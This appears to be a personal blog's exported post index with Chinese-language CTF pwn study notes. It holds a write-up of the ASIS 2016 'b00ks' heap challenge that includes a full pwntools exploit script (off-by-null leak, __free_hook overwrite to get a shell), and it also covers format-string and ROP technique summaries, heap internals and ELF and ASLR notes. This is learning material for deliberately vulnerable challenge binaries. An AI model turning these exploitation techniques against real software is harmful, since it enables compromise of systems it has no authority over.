<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2016-Asis-books_writeup]]></title>
    <url>%2F2019%2F03%2F31%2F2016-Asis-books-writeup%2F</url>
    <content type="text"><![CDATA[wiki上的一道经典例题，写wp的目的一方面是wiki上一些细节讲的有点不太清楚，一方面是自己巩固一下做过的题目，看是否是真的掌握。 首先提供题目二级制文件链接：books 预览：拿到题目先看基本信息： 可以看到题目是64位文件，所有保护全开，一般这种题目是堆题，且看到full relro则大概率是篡改malloc_hook。 然后运行一下，找到程序运行入口，然后放入ida里看反汇编码： 准备功能分析：（不要忽视，做的题多了会发现有时候这里可能存在关键漏洞） 这里因为我已经做过了，所以函数名和一些变量名已经被我改成了对应的功能，可以看到程序开头先打印欢迎语，然后让我们输入作者（字符串储存在bss段，是可控的），这里的输入函数存在off-by-null漏洞，当输入32个字符时，既可以用来change，又可以用来leak(因为字符串后面没有‘\x00’，所以可以泄露authername这个字符串之后的内容直到’\x00’，这也是常见的套路。。。) 程序主功能分析：程序有五个功能：1.create 2.delete 3.edit 4.print 5.change_authorname，大致的整体功能实现就是用户申请书本，然后书的名字和内容大小都由我们自己来定，并将它们的内容存放在堆上，然后创建一个大小固定的Book结构体来储存被创建的book的信息，其也放在堆上，创建一个book以后堆上的结构和bss段的联系大概如下图所示： 紧接着删除功能删除booklist中的Book指针，并且将指针归0，没有uaf漏洞 然后edit功能就是将Book的des重新输入，没有漏洞 然后是print功能，打印书的ID,name,des和书的作者，这个漏洞之前提过，分析bss段的结构就可以发现打印作者使可以泄露第一个book指针，这里需要注意，因为之后的所有chunk大小我们都可以自己控制，所以经过简单的计算，就等于我们泄露了所有的book指针和name,des指针！！！这是解题的一个关键之处。 再之后是change_authorname功能，就是更改作者的名字，当输入32个字节时依然存在off-by-null漏洞（因为是off-by-null,不是off-by-one，所以难度会有所加大）。 漏洞利用思路：leak: 在前面已经提过，利用authorname最后一个字符’\x00’被book指针覆盖所以可以泄露book1指针的值，从而泄露之后所有的指针。 难点在于怎样泄露Libc，这里有一种新的方法，适用于chunk大小我们自己可控并且其地址可以泄露的情况，我们把book2的name和des申请的大于128KB（0x20000），则ptmalloc2将会用mmap来为我们分配内存，然而mmap的地址和libc的地址相对偏移不变（经过一次调试就能确定偏移），所以我们只要泄露了book2的name地址就等于泄露了libc，那再思考怎样泄露book2的name地址呢？现阶段我们只能利用程序自带的打印功能，他将打印所选的book的name指针和des指针所指向的内容，由book1指针已经由于off-by-null而最后一个字节被变为00，其之前肯定大于0，因为内存的分页分配机制，所以想让其被改过后的book1指针落入book1的des中，book1的des要相对的大一点。。。并且利用edit功能来重新编写book1的des，在book1指针指向的那个地方（这里的偏移不变，通过调试确定）伪造一个fake_book2_struct，其name指针为book2的name指针的地址（为addr_book1+56），然后利用打印功能来leak出book2的name指针的值，Libc泄露成功！！！ change:利用程序自带的edit功能来改malloc_hook为one_gadget（one_gadget需要多次尝试），因为我们已经可以掌控book1的des指针的值了，所以也就实现了任意地址写入。之后再次申请的时候就会触发malloc_hook拿到shell。 exp如下（我当时做的时候是改free_hook，具体的一些偏移量需要自己调试来确定，exp只提供思路！！！）：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#coding:utf-8from pwn import *context(os = 'linux',arch = 'amd64')context.log_level = 'debug'p=process('./b00ks')P=ELF('./b00ks')libc=ELF('./libc.so.6')#先创建每个函数def create(name_size,name,des_size,des): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil(': ') p.sendline(str(name_size)) p.recvuntil(': ') p.sendline(name) p.recvuntil(': ') p.sendline(str(des_size)) p.recvuntil(': ') p.sendline(des)def delete(ID): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil(': ') p.sendline(str(ID))def edit(ID,des): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil(': ') p.sendline(str(ID)) p.recvuntil(': ') p.sendline(des)def printf(ID): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil(': ') for i in range(ID): book_id=p.recvline()[:-1] p.recvuntil(': ') book_name=p.recvline()[:-1] p.recvuntil(': ') book_des=p.recvline()[:-1] p.recvuntil(': ') book_author=p.recvline()[:-1] return book_id,book_name,book_des,book_authordef change(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil(': ') p.sendline(name)#创建两个书本p.recvuntil(': ')p.sendline('a'*32)create(8,'a'*4,1024,'a'*8)create(0x21000,'b'*4,0x21000,'b'*8)#泄露第一个书本的地址book1_id,book1_name,book1_des,book1_author = printf(1)book1_addr=u64(book1_author[32:32+6].ljust(8,'\x00'))log.success('book1_addr=' + hex(book1_addr))#改第一个书的description为伪造的book2（name指针和des指针指向book2的name指针和des指针）payload='a'*0x3c0+p64(1)+p64(book1_addr+0x38)+p64(book1_addr+0x40)+p64(0xaaaa)edit(1,payload)#改名字覆盖book1的地址，使被覆盖的地址指向伪造的Bookchange('a'*32)#泄露libc地址和查看one_gadget地址offset=0x5b2010 #需要自己确定，变动较大。#one_gadget=0x45216one_gadget=0x4526a#one_gadget=0xf02a4#one_gadget=0xf1147book_id,book_name,book_des,book_author = printf(1)book2_name_addr=u64(book_name.ljust(8,'\x00'))log.success('book2_name_addr=' + hex(book2_name_addr))libcbase = book2_name_addr - offset#通过伪造的Book改book2的des指针，使其指向__free_hook, 通过edit功能将__free_hook改为one_gadget free_hook = libc.symbols['__free_hook'] + libcbase#binsh_addr=libc.search('/bin/sh').next() + libcbase#system_addr=libc.symbols['system'] + libcbaseedit(1,p64(free_hook))one_gadget_addr = one_gadget + libcbaseedit(2,p64(one_gadget_addr))#然后调用删除功能，调用free()函数delete(2)p.interactive() 第一次做的时候的一些心得:2016-Asis-b00ks: 个人感觉这一题难度较大（off-by-null），我对这别人wp才勉强看懂并且感觉思路比较巧妙，也获益匪浅，最后自己拿了shell也比较开心，起码证明自己真的懂了。。。。。想总结几个小的需要注意，很有可能成为阻碍我们做题的关键点。 关于调试：调试最好用gdb attach pid 在exp未成形之前，保证不要有语法错误，然后一点一点跟exp看数据行了，如果开了PIE的话，下断点要用基址（用vmmap看）+ida里的地址才是程序真正的虚拟地址。调试过程x/160xg addr 看bss段的数据或者堆的数据。 libc的偏移泄露新方法：mmap出来的地址和libc的地址相对位置不变。 除了用got表之外的新方法。 relro full 时虽然无法改got中的数据，但是可以改__free_hook(malloc同理） 在recvuntil()接收时一定要注意‘ ’和‘\n’的处理。。而且一般只要截取最后一个标点即可。 python的函数返回值可以有多个，同理也是可以多个接收。for i in range(整数)的巧妙运用也可以接收到自己想接收的数据。 泄露Libc’的思路可以为先想着泄露一块当前程序的一个地址（mmap地址或者堆的地址），然后通过gdb调试看某一次的程序来确定偏移（got则不需要），之后用泄露的地址加上偏移即可。 如果程序有对某一块内存写的功能函数，我们就可以想着控制这块内存的地址，进而造成任意内存写。 one_gadget的运用，暂时觉得可以逐个尝试，有可能需要构造rax rsp等等。调试问题还未解决]]></content>
      <categories>
        <category>ctf-writeups</category>
      </categories>
      <tags>
        <tag>堆的利用（off-by-one）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串小心得]]></title>
    <url>%2F2019%2F03%2F31%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B0%8F%E5%BF%83%E5%BE%97%2F</url>
    <content type="text"><![CDATA[格式化字符串的一些总结和心得： 虽然做的题目不多，但是还是有一点感悟，小总结一下。 格式化字符串漏洞可以实现的事情： 读（泄露函数地址），一般用于泄露出想要篡改的函数的got表的内容，也就是其真正的地址，需要ELF功能来获取got表地址，payload一般为‘%k$s’+p32(fun_got)，k为fun_got这个字符串所在位置的偏移，还要注意x86和x86-64的偏移计算方法的差别。 写（篡改）： 篡改某一个函数的got表内容，这个函数选择很重要，可能决定了exp的复杂程度： 当程序没有循环时，尽量选择printf()之后的函数，实在不行只能同时改两个地址，一个选择的函数的地址，一个fini_arry首元素的内容为start的地址，使程序重新运行。 当程序有循环时就无需那么麻烦。 看程序中有无system(‘/bin/sh’): 有的话难度较低，将printf之后的一个函数的got表改成system(‘/bin/sh’)的地址即可，再想办使这个函数被调用。 没有的话得先用读的功能泄露Libc版本，然后获取system函数的地址，这时候所选择函数必须是类似这种：puts(buf),printf(buf)这种，并且buf必须可输入，这样才可将buf改为‘/bin/sh’并调用system(‘/bin/sh’)。 特殊情况： 改写某一数据使其符合if语句条件从而调用if之后的system(‘/bin/sh’)。 改写printf函数的调用函数（不是main函数）的返回地址，使其返回到system(‘/bin/sh’)上。这里比较特殊，需要调用函数不太复杂，其中没有很多变量，才能使得其bp能在偏移中找到，然后才能确定offset。进而用读的方式获取返回地址，然后篡改。 利用形式： x86：单个改写可用fmtstr_payload=(k,{fun_got:sys_addr})，较简单。 x64：因为地址中带有‘\x00’所以直接用%k$lln改写时不能将p64(fun_got)放到‘%k$lln’前面，否则会截断，只能将其放在后面。或者采用$hn的方法改写尾部。 注意两个对齐：格式化字符串字节数与地址对齐，输出长度与改写数据对齐。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寒假小结]]></title>
    <url>%2F2019%2F03%2F31%2F%E5%AF%92%E5%81%87%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[寒假做的题目总结与反思：shellcode部分：BITSCTF 2017-Command_Line总结与不足： 题目较简单，接收缓冲区地址后算一下偏移量，直接将shellcode注入到返回地址之后，然后跳到那里即可。 BSides San Francisco CTF 2017-b_64_b_tuff总结与不足： 涉及到base64的问题，需要了解知识，只有字母和数字和+，/能参与base64编码，void( )(void )为函数强转，后直接调用。 需要先将shellcode编码为合法字符，在将base64解码后传输给进程，这里需要用到msfvenmo中的编码器，因为不知道什么原因我的虚拟机下载不了。但是用法及参数需要了解。。 CSAW Quals CTF 2017-pilot总结与不足： 题型有新意，设坑巧妙（也有可能是因为做题少第一次见），因为x64下的shellcode最短只能找到27位，大于24位，在其运行时尾部会被覆盖从而无法正常运行，需要将shellcode剪裁修改，加一些字节码，使其前后能够连接上。 jmp（短跳转）的字节码为EB,其偏移值是用其跳转的目的地址减去其下一条指令的起始地址。（还有其他的字节码，FF等） Openctf 2016-apprentice_wwwzon总结与不足： 知识储备不够，很多基础东西看不懂就很耽误时间和耐心，如： int型强转：_int8:强转为一字节（相当于a=a&amp;0xff） _int16强转为两字节 test表示and功能 常与jnz或jz一起用，用来看一个寄存器是不是0. mprotect()函数为改变内存某一区域的权限 str()函数和ord()函数的作用，需要自己试。。 源码看的不深刻，没有思路，还是只能干瞪眼，思路自己没有。 仍存在的问题：为什么sendline()中一定要用str强转，和scanf()有关么？把str(ord(shellcode[i]))直接变为shellcode[i]也不行。。 Openctf 2016-tyro_shellcode1总结与不足：可能是我水平太低这题的意图看的不太懂，觉得有点水。。。。直接放上shellcode后直接调用。。。 收获就是函数指针强转的形式：int（ p）(void* )为定义一个函数指针p，函数参数为void 型，返回值为int型，(int ( )(void *)p)() 的意义为将p强转为函数指针后调用函数。 rop部分：基本rop:sniperoj-pwn100-shellcode-x86-64:train.cs.nctu.edu.tw: ret2libctrain.cs.nctu.edu.tw: rop2013-PlaidCTF-ropasaurusrexDefcon 2015 Qualifier: R0pbaby中级rop:2016 XDCTF pwn1002016 华山杯 SU_PWNi春秋：RedHat 2017-pwn1： 巩固一下ret2libc3中的先向W区写入参数‘\bin\sh’然后再回到main调用system，但是到现在依然不明白为什么main函数返回以后padding要减8. 学会了Ctrl+s找RWX区，W存在可写入的区域。 养成context(os=’linux’,arch=‘’,timeout=1)的习惯。。。（没写timeout=1程序没反应，设置timeout=1就是为了防止程序假死，1秒之后将权限给下一行） scanf()要准备的参数顺序为横看顺序 bugs bunny ctf 2017-pwn150： 题型基础，简单的找system函数和参数，简单的rop寻找 学到的技巧：快捷键，D将指令解析为数据，C将数据解析为指令。（需先点击地址） 问题：为啥call system可以 放入system.plt却不行。 参数sh也可以开shell Tamu CTF 2018-pwn5： 题型基础，简单的系统调用 学到坏字符：\x0a,\x00等影响程序，和利用程序中自带的缓冲区输入/bin/sh。 Security Fest CTF 2016-tvstation未成功： 加深了对动态链接库的理解，其和elf文件一样也有代码段和数据段，可以适用于elf文件的一切命令。 如果题目给了库文件，则确定偏移是最重要的事，再确定库再内存中的开头实际地址。 有了库的开头之后就可以利用库中函数命令数据相对偏移不变的原理利用其中的命令（gadgets）和字符串等数据。 但是不知道为啥getshell不成功，感觉思路没问题。 LCTF 2016-pwn100未成功： 思路很清晰，是对特殊gadgets的考察，先用puts()函数泄露read函数的地址，用的是padding+p64(pop_rdi_addr)+p64(参数/是需要泄露的数值的地址)+p64(put_plt)+p64(start_addr/也就是返回地址)再确定Libc，确定system()的地址，然后用padding+p64(wanneng1)+[0，1，需要调用函数的got表地址，参数3，参数2，参数1]+p64(wanneng2)+’a’*56+p64(返回地址) 的布局来调用read()函数将/bin/sh读入，再调用system。 需要注意的两个地方是： puts()打印的结果带有换行符，接收时必须u64(p.recv()[:-1].ljust(8,’\x00’)),[:-1]是为了舍去最后的换行符，ljust(8,’\x00’)是为了时字节数为8个才能unpack。 /bin/sh字符串地址的选取，需要ctrl+s来选取w段，注意不能选取setbuf的段。（待进一步确定） 和上一题一样，不知道什么原因无法getshell。 TJCTF 2016-oneshot未成功： 学会使用工具one_gadget，其在libc.so文件中找execve(‘/bin/sh’)的跳板，但需要一定的条件。 思路是先用程序的读任意地址的内容功能泄露一个函数的got表内容，然后泄露one_gadget的实际地址，利用程序的第二个功能来直接跳到其位置。 不知道为什么exp运行不成功。 调整栈帧的技术：Alctf-2016-vss: 思路：因子函数的溢出长度不够。但是rop链长度较长，所以将rsp抬高，使其与main函数的输入点对接使rop能够延续。 收货以及需要注意的地方： 找栈溢出函数是最重要的事，一般来说一个变量位置为rbp-k，若k较大则溢出函数的可能性较小（根据可以输入的数据长度综合判断）。 syscall是在x86-64上进入内核模式的默认方式。该指令在Intel处理器上的32位操作模式下不可用。 sysenter是最常用于在32位操作模式下调用系统调用的指令。它类似于syscall，有点更难使用，但是这是内核的关注。int 0x80是一种调用系统调用的传统方法，应该避免 rsp抬升的高度一定要计算好（这一题还未算好，不知道为啥少了8字节）。 pwnable.kr-simplelogin: 更深的理解了stack pivot 在bss段构造了fake stack，有点绕的是虽然输入长度过段控制不了rip，但是漏洞函数返回地址正好是leave; retn;的地址！所以无需考虑这一点，直接用就行，还是需要先找清除漏洞函数和可以控制的数据长度，来判断使用什么方法来控制ip. base64编码以后数据长度会增加1/3。需引入base64模块，b64encode(payload)。 2018 安恒杯 over（未完成）： 再fake rbp之前构造fake stack进而构造rop链 但是怎么泄露的栈地址没有看懂。。。 X-CTF Quals 2016 - b0verfl0w： 题目简单但思想很深邃，首先看NX没开，想到用shellcode，再看可以溢出的长度，发现fake ebp之前有0x20的空间，fake eip之后只有14字节的空间，无法构造好的rop链，再用ROPgadget一搜索发现有jmp esp(只能搜操作符)，则想到调整栈帧，在fake eip之后为需要构造的命令，使eip跳到shellcode上去。 新姿势：可以自己编辑shellcode：sub_shellcode=asm(‘sub esp,0x28;jmp esp’) 格式化字符串：wiki:64 位程序格式化字符串漏洞： 明了自己要做的事是读还是写，读的话用$s，并且要找字符串地址的偏移，写的话要找字符串的偏移，不要弄混了。 hijack GOT： 大致思路就是利用格式化字符串来篡改某个函数的got表的内容为system的地址。（能否为plt表有待验证） 题目质量较高，首先要求必须要读懂程序什么意思（分析程序是费时间的事情），分析每一个函数每一个功能，可参考文章：c语言阅读问题 其次要看程序是否有返回，是否能自己返回运行，这点很重要。 寻找的目标函数要有直接放入字符串的特点。例如：puts(s)，printf(s)，篡改后将s（s也要有可输入的提特点）改为/bin/sh就可以直接调用了。 先考读，再考写，再考如何利用。 目前大致思路已经明了，但是细节还是不行，有‘/bin/sh;’中的‘；’ hijack retaddr: int变（_BYTE）强制类型转换就是把前24位全部抹去。 int a = 3； 00000000 00000000 00000000 00000011 （强转byte时前面24个0被截断）byte b = 3； 00000011int a = -3； 11111111 11111111 11111111 11111101 （强转byte时前面24个1被截断）byte b = -3 11111101 用read读取时每一个输入都是字符，比如输入1000，储存到缓冲区为\x30\x30\x30\x31。 常见程序类型：一个函数输入用户名和密码（这里需要读懂其匹配方式），然后又一个函数让你选功能，每一个功能又一个函数。函数之间传参基本是用地址传递，需熟练。 分块思想：先想好分几步再想每一步应该做什么，一步一步完成。 还是p.recv()+p.sendline()好用，不要用p.sendlineafter()。 接受的时候要注意字符串的末尾是否有‘\n’，若有的话可以用p.recvuntil(‘\n’)或者p.recvline().strip()。 熟悉调用函数和被调用函数的关系，他们之间rbp的偏移不变。 代码有不懂的地方。 一些摸索，关于接收问题：若返回值是以字符串的形式（puts，%k$s）打印出来的，则需要u32(p.recv()[:])或者u64(p.recv()[:])来解包，若以整数形式则直接int(p.recvuntil(‘\n’),16)。 [:]的用法参考;[:]，前留后不留。 i春秋：MMA CTF 2nd 2016-greeting： 改写fini_arry使程序返回，需同时改写两个数值，exp看不懂。（总结时回头看终于理解！！） 他的坑在于printf()并不是直接的printf(s)，而是printf(‘Nice to meet you, %s’,s)，在输入s时必须要去掉len(‘Nice to meet you, ‘)个字符。其实就是截断问题，根据hn,hhn,n的不同类型截断。 22angstromctf 2016-format1： 开始时思路为想用格式化字符串篡改main函数返回地址为call system的地址，后来经过调试发现和之前做例题差别较大。 实际上思路很简单，用写的功能篡改secret的数据。 但是不知道为什么我自己的成功不了。（写总结时突然想到，原因是如果将p64(fun_got)放在‘%K$hn’前面字符串会截断！！！） 要注意两个对齐，一个是地址对齐，一个数据长度对齐。 Nullcon Hackim 2017-question1： 这一题先用checksec查看时发现NX没开（当时没注意）和relro没开，所以我第一反应想到的是got表泄露，成功了。 给的exp是用shellcode放进堆里，也很巧妙，因为没有注意nx所以没有想到。 ReaHat 2017-pwn2： 简单的泄露libc然后利用即可。 volga ctf 2013-Exploitation 200： 这题有坑，下次见到过于复杂的if条件时可以想着跳过，控制程序执行流。]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
        <tag>小心得</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识点总结与学习资料整理]]></title>
    <url>%2F2019%2F02%2F19%2F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点总结：在学长的帮助和自己对安全知识的好奇之下入坑ctf，转眼间到现在已经有四个月了（一月因为要复习期末几乎荒废了），仔细想想这一路来除了某些时候P1umer学长和bgjj的激励和鞭策让我知道自己很菜之外，大部分时间还是靠自己的兴趣去学习的，这一点让我觉得还行，起码没有违背我在大学之前定的人生目标！！菜鸡有菜鸡的活法！！！QAQ 到现在为止，除了python沙箱逃逸，linux内核和虚拟机逃逸这几块比较复杂的地方之外，已经知识点大部分学完了，题目有的地方刷了一点，有的地方没刷，但原理已经都能明白并且例题都跟着做了一遍。寒假也快结束了，想在这里记录一下自己学习的历程以及一些知识点的整理，后面的部分还会有资料整理。 前提准备：工具： ubuntu虚拟机 IDA pro用于静态调试 gdb用于动态调试以及peda插件，pwntools模块 知识： 汇编基础语法 python基础语法 c语言较扎实（特别是指针和链表这一块） linux基本命令 第一阶段：pwnable.kr的第一部分：这一阶段主要的目的是了解pwn的题目形式，毕竟它和以往学的数学物理无论是学习还是做题形式都不一样，可能开始时都不会做，会毫无头绪直接看writeup，但是慢慢地就会习惯，找到套路，并且熟悉Linux的常用命令与怎么远程连接服务器，从远程服务器下载文件等基本功，等于是熟悉环境和题目大致形式的一个转变的过程。我的建议是在做完以后再自己独立地从头到尾地把exp整理一遍，确保自己能独立做出并理解其中的思想。 第二阶段：ctf-wiki与i春秋的体系学习：栈部分：分为以下几大块： 熟悉基本函数调用的栈的排布格局，理解leave，retn，call的意义，知道怎么算偏移，简称为基础栈溢出。 理解shellcode，在未开NX的情况下懂得利用shelllcode。 rop: 基础rop 带libc的rop brop stack pivot srop ret2_di_runtime_reslove ret2vsdo 在i春秋上有栈这一部分较完整的教程，且配有课后习题，比较好，配合wiki学习效果更佳，因为后来我发现看一篇文章很难理解一个技术，一般需要参考好几个。 格式化字符串部分： i春秋的第六篇文章说的很清楚，题目质量也不错，配合wiki学习三天就可以结束。 堆部分： 学习堆的内存管理机制（较重要！！！不理解后面都是扯淡） 堆漏洞： uaf，unlink，off-one-by 堆溢出： fastbin-attack: double free，house of sprit unsorted-attack house of lore house of force 还有几种house of XXX系列是比较新的技术，暂未学习，也很少出现。 第三阶段：专题刷题： 各个板块学习完以后的刷题，巩固知识点的理解。 第四阶段：综合刷题： 综合刷题，在不告诉你漏洞方向与漏洞点，没有提示的情况下独立做出来题目才是真本事。 资料整理：自己学了几个月了也收集了不少好的资料，在这里整理一下，一方面便于我自己使用，一方面整理一下我乱的书签。 学习： ctf-wiki在阶段比较全的成体系的资料之一 i春秋论坛上比较好的栈和格式化字符串的学习资料，配有课后习题，个人感觉质量比较好 （在左上角的搜索框里输入pwn入门就会出现10篇教程，一篇一篇看即可） 北京邮电大学瑶光战队学习资料 (比较全面，可以用来复习用) 看雪知识库 CTF-All-IN-ONE (一本即将出版的书，里面大部分都是pwn的内容，题目质量也比较高) 一个pwn的项目收集 在i春秋上搜pwn的网课，有一个Atum师傅的课，里面有不少资料和学习方法，推荐去看。 一些博客： 台湾的angleboy 不认识这位师傅，但是他很多文章写得很好 深入理解计算机系统浓缩总结 P1umer wjllz p4nda misty 刷题： 2018比赛题目收集 ctf-wiki里的题目 pwnable.kr pwnable.tw Jarvis oj ctf-all-in-one里的题目 shellcode收集站： shell-storm.org 还有很多小的资料都是在以上列举的这些大资料里的，就不一一列举。 继续学习去了，今天任务还没完成！！ （希望再过多年以后还能凭着自己内心的热爱为安全事业贡献一份力。。]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[堆的理论知识学习]]></title>
    <url>%2F2019%2F02%2F13%2F%E5%A0%86%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近花了两天时间上网查阅资料学习了堆的内存管理模式，找到了几篇还不错的文章，在此分享一下： Linux堆内存管理深入分析上 Linux堆内存管理深入分析下 PWN之堆内存管理 申请内存块 看雪的求助 较详细的内存分配过程 Glibc 内存管理 Ptmalloc2 源代码分析 华庭（庄明强） (经典，较长但较详细，可自己上网找) 这几篇文章讲的已经比较详细，基础的东西我就不再赘述，只是总结一下我自己的一些心得和理解： 所谓堆的内存管理模式看起来比较复杂，主要原因是知识点较多，引入新的结构体和新函数比较多，让人一下子不能理解地那么深，或者说记忆不了那么多，耐心多看几遍就会好很多，需要一定的时间沉淀。 主要内容有三点： 一是几种结构体的介绍：malloc_state， malloc_chunk，heap_info，和chunk的结构 ||| fast_bins，small_bins，large_bins，unsorted_bin。 二是arena的介绍，多线程堆是如何管理的，malloc中mmap和brk的区别，main_arena和thread_arena的区别。（这一点在第一篇文章有详细介绍） 三是内存的分配与回收（最后一篇文章较详细），这一点最难也最重要，又全部围绕怎么让这个过程变得高效来设计（主要在于large chunk的分配需要进行碎片合并和整理的大循环）： 当malloc(size)的时候，先进行一部分处理和加锁后，开始正式分配，先看size的大小，如果在fast_bins之内，就先遍历fast_bins中有没有正好适合的chunk有的话分配后返回，没有的话或者size的大小大于64bytes小于512sizes则进入small_bins寻找，找到合适的返回，没有的话或者size大小大于512bytes属于large chunk，大循环开始，开始对fast_bins里的碎片开始整理和合并，物理地址相连的chunk合并以后放进unsorted_bin里，不能合并的直接放进unsorted_bins里，然后对unsorted_bin中的chunk从其尾指针指向的chunk开始（FIFO算法）进行遍历，if(大小刚好符合) {取出分配返回} else {将其放入对应的bin中，这个过程结束会将fast_bins和unsorted_bins清空}，遍历完成后再看last remainder chunk，其大小大于size时切割然后unsorted_bin的尾指针指向新的last remainder chunk，并更新储存其数据内容的结构。。。。 内容太多，直接看最后一篇文章吧QAQ。 orz]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>pwn基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二进制方面知识扩充]]></title>
    <url>%2F2019%2F01%2F28%2F%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%B9%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%89%A9%E5%85%85%2F</url>
    <content type="text"><![CDATA[PIE和ASLR：参考链接：对PIE和ASLR的理解 首先，ASLR的是操作系统的功能选项，作用于executable（ELF）装入内存运行时，因而只能随机化stack、heap、libraries的基址；而PIE（Position Independent Executables）是编译器（gcc，..）功能选项（-fPIE），作用于excutable编译过程，可将其理解为特殊的PIC（so专用，Position Independent Code），加了PIE选项编译出来的ELF用file命令查看会显示其为so，其随机化了ELF装载内存的基址（代码段、plt、got、data等共同的基址）。 PIE只是在编译的过程中赋予了ELF加载到内存时其加载基址随机化的功能，也就是说PIE编译出来的ELF如果在ASLR=0的情况下，ELF的加载基址也是不会变的。 所以这是ASLR 的三个级别变成了 ：0， 不开启任何随机化；1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化；2，开启heap随机化。 因而，我们会发现PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了：） ELF文件的结构：参考链接：参考 elf文件分三种类型： 1、目标文件（通常是.o); 2、可执行文件(我们的运行文件) 3、动态库(.so) ​ 我们先讲一下可执行文件。 ​ 可执行文件一般分成4个部分，能扩展，我们理解这4部分就够了。 ​ 1. elf文件头 ，这个文件是对elf文件整体信息的描述，在32位系统下是56的字节，在64位系统下是64个字节。 对于可执行文件来说，文件头包含的一下信息与进程启动相关 e_entry 程序入口地址 e_phoff segment偏移 e_phnum segment数量 ​ 2. segment表， 这个表是加载指示器，操作系统（确切的说是加载器，有些elf文件，比如操作系统内核，是由其他程序加载的）,该表的结构非常重要。 typedef struct { Elf64_Word p_type; / Segment type / Elf64_Word p_flags; / Segment flags / /*segment权限，6表示可读写，5表示可读可执行 Elf64_Off p_offset; / Segment file offset / /段在文件中的偏移/ Elf64_Addr p_vaddr; / Segment virtual address / /*虚拟内存地址，这个表示内存中的 Elf64_Addr p_paddr; / Segment physical address /物理内存地址，对应用程序来说，这个字段无用*/ Elf64_Xword p_filesz; / Segment size in file / /段在文件中的长度/ Elf64_Xword p_memsz; / Segment size in memory / /在内存中的长度，一般和p_filesz的值一样*/ Elf64_Xword p_align; / Segment alignment / / 段对齐/ } Elf64_Phdr; ​ 3. elf的主题，对于可执行文件来说，最主要的就是数据段和代码段 ​ 4. section表，对可执行文件来说，没有用，在链接的时候有用，是对代码段数据段在链接是的一种描述。 ​ 整个elf文件的组成可以使用下图来描述: ELF文件的载入和运行及动态链接：参考链接:重读《深入理解计算机系统》 运行地址也就是链接地址。实际上指的是，程序在运行过程中，该指令对应的内存地址。 我们再回到本系列的主题：程序的加载和运行。可执行程序生成之后，是保存在硬盘中的，当用户执行该程序的时候，该程序会被加载器按照program header table的描述将程序的代码段和数据段从硬盘加载到内存中。在使用MMU的机器上，CPU处理的地址是虚拟地址。同样的，加载到内存中的地址指的也是虚拟地址。由于虚拟内存的抽象，每个进程都认为其独占内存，因此，每个可执行程序总是可以被加载到相同的内存地址（虚拟地址），其实，这些内存地址都是位于各个可执行程序独自的内存空间的地址。但是，对于MMU来讲，这些相同的虚拟地址其实对应了不同的物理地址。而对于CPU来讲，指令是按照其虚拟地址一条条的被加载到CPU中运行的。 如上所述，加载器是按照program header table的描述来给程序代码段分配指令地址的。具体的过程如下： 还记得我们在可执行文件详解中segment和section的对应关系吧？每个section按照这个mapping表顺序排列构成了不同的segment。其中第2个segment就是可执行文件的代码段。代码段中第一个section是.interp，其起始地址是0x400238，然后，加上.interp section的大小，就是下一个section .note.ABI-tag的起始地址。依次类推，对于可执行文件详解中的可执行文件add来讲，其.text的起始地址就是0x400430。 为什么对于X86_64架构来讲，所有可执行文件的text segment的起始地址都是0x400000? 实际上是链接脚本规定的，在链接过程中，链接器会根据链接脚本的描述来构建可执行文件。对于X86_64来讲，其默认的链接脚本位于/usr/lib/ldscripts/elf_x86_64.x。在其中我们发现这句话：__executable_start = SEGMENT_START(&quot;text-segment&quot;, 0x400000))它指定了可执行的text segment应起始于0x400000。 根据上述objdump -d的输出，.text的第一个函数是_start，因此，_start的第一条指令地址就是0x400430。后面每个函数的地址等于它的上一个函数的地址加上该函数自身的字节数。这样，完成了给每个函数重定位（分配运行地址）的过程。 函数中的每条指令的地址的重定位类似于函数重定位。函数的首地址即是第一条指令的首地址，后面每条指令的地址依次等于上一条指令的地址加上该指令的字节数。回忆编译过程分析中，在编译完成后，指令引用外部符号时，生成了对应的操作数和符号的占位符，此时，对于除动态链接库的符号外，其他的符号都已经有了确定的地址。因此，结合符号表我们就可以将类似的指令完成重定位。 